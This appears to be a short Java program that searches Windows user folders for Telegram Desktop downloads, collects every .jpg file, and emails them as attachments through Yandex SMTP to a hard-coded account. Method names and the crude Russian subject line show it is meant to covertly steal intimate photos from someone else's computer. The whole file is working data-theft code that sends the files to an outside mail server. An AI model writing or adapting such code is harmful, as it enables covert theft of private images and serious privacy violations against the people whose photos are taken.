import java.io.File;
import java.util.ArrayList;
import java.util.Properties;
import javax.activation.*;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;


public class mamain {

    private static ArrayList<String> getGolieISmeshnie()
    {
        ArrayList<String> goliefotochki = new ArrayList<String>();
        String directory = "";
        // определяем объект для каталога
        File dir = new File("C://Users");
        // если объект представляет каталог
        if(dir.isDirectory())
        {
            // получаем все вложенные объекты в каталоге
            for(File item : dir.listFiles()){

                if(item.isDirectory()){
                    if(new File(item.toString() + "//Downloads//Telegram Desktop").isDirectory())
                    {
                        directory = item.toString()+ "//Downloads//Telegram Desktop";
                        break;
                    }
                    //System.out.println(item.getName() + "  \t folder");
                }
            }
        }

        File telega = new File(directory);
        for (File item : telega.listFiles())
        {
            if (!item.isDirectory())
            {
                if (item.toString().lastIndexOf(".jpg") != -1)
                    goliefotochki.add(item.toString());
            }
        }
        return goliefotochki;
    }

    public static void main(String[] args){

        final String username = "dim.kobzev2013@yandex.ru";
        final String password = "*****";

        Properties props = new Properties();
        props.put("mail.smtp.auth", true);
        props.put("mail.smtp.starttls.enable", true);
        props.put("mail.smtp.host", "smtp.yandex.ru");
        props.put("mail.smtp.port", "25");

        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password);
                    }
                });

        try {

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress("dim.kobzev2013@yandex.ru"));
            message.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse("dim.kobzev2013@yandex.ru"));
            message.setSubject("Я на джаве пенетрейшн твою тёлку");
            message.setText("Тем более правда");

            MimeBodyPart messageBodyPart;
            Multipart multipart = new MimeMultipart();


            ArrayList<String> foto = getGolieISmeshnie();
            if (foto.size() == 0)
                return;

//            String file;
//            String fileName;

            for (int i = 0; i < foto.size(); i++) {
                String file = new String();
                file = foto.get(i);
                String fileName = new String();
                fileName = retName(file);



                messageBodyPart = new MimeBodyPart();
                DataSource source = new FileDataSource(file);
                messageBodyPart.setDataHandler(new DataHandler(source));
                messageBodyPart.setFileName(fileName);
                multipart.addBodyPart(messageBodyPart);

                message.setContent(multipart);

            }

            System.out.println("Sending");

            Transport.send(message);

            System.out.println("Done");

        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }

    private static String retName(String str)
    {
        int index = str.lastIndexOf("\\");
        String result = str.substring(index+1, str.length());
        return result;
    }
}
